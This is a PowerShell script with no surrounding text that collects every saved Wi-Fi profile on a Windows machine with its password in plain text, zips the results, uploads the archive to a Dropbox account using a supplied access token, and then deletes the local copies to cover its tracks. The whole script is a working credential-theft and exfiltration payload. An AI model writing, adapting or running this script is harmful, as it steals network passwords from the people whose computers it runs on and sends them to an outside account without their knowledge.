param(
    [string]$AccessToken
)

$folderDateTime = (Get-Date).ToString('yyyy-MM-dd_HH-mm-ss');
$userDir = (Get-Item env:\userprofile).Value + '\Documents\Networks_' + $folderDateTime;
New-Item -Path $userDir -ItemType Directory;
netsh wlan show profiles | Select-String ": " | % { $_.ToString().Split(":")[1].Trim() } | % {
    netsh wlan show profile name=$_ key=clear | Out-File -FilePath ($userDir + '\' + $_ + '.txt')
};
Compress-Archive -Path $userDir -DestinationPath ($userDir + '.zip');
Start-Sleep -s 5;
Copy-Item -Path ($userDir + '.zip') -Destination 'C:\Users\Public\';
Remove-Item -Path $userDir -Recurse;

$hookurl = "https://content.dropboxapi.com/2/files/upload";
$file = "C:\Users\Public\" + ($userDir.Split('\')[-1]) + ".zip";
$headers = @{
    Authorization = "Bearer $AccessToken";
    "Content-Type" = "application/octet-stream";
    "Dropbox-API-Arg" = "{""path"": ""/Networks.zip"", ""mode"": ""add"", ""autorename"": true}"
};
Invoke-RestMethod -Uri $hookurl -Method Post -Headers $headers -InFile $file;
Remove-Item -Path $file;
